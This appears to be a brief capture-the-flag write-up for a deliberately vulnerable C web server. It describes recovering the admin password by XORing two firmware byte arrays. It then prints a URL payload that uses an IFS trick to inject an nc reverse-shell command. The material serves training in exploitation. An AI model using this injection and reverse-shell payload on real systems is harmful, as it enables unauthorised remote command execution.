# Ghostly statistic panel
A vulnerable http server written in c. This is the intended solution:

There is an auth layer so we need the firmware dump to analyse the password.

find AUTH_PASS_KEY and AUTH_PASS_ENC byte arrays. XOR them together which gives: `n4bby_sp3ctral` so login with admin and the password now you can exploit the RCE.


```
http://127.0.0.1:8084/proc/1/stat;IFS=_;command='nc_127.0.0.1_9001_-e_/bin/sh';$command;
```

